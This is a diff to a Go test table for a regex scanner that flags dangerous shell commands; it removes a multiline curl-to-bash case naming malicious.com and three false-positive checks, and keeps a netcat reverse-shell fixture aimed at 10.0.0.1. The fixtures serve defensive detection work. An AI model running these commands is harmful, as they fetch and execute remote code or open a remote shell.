@@ -48,30 +48,9 @@ func TestRegexScanner_Scan(t *testing.T) {
 			wantFinding: "Pipe to Shell",
 		},
 		{
-			name:        "Curl Multiline Pipe Bash",
-			content:     "curl https://malicious.com/install.sh \\\n | bash",
-			wantFinding: "Pipe to Shell",
-		},
-		{
 			name:        "Netcat Reverse Shell",
 			content:     "nc -e /bin/sh 10.0.0.1 1234",
 			wantFinding: "Reverse Shell",
-		},
-		// False Positive Checks
-		{
-			name:        "Sync -e (False Positive Check)",
-			content:     "sync -e something", // Should not match nc -e
-			wantFinding: "",
-		},
-		{
-			name:        "Curling (False Positive Check)",
-			content:     "curling stone | bash", // Should not match curl | bash
-			wantFinding: "",
-		},
-		{
-			name:        "Curl Unrelated Multiline (False Positive)",
-			content:     "curl http://example.com/file\n# some comments\n# ...\ncat file | bash",
-			wantFinding: "",
 		},
 	}
 
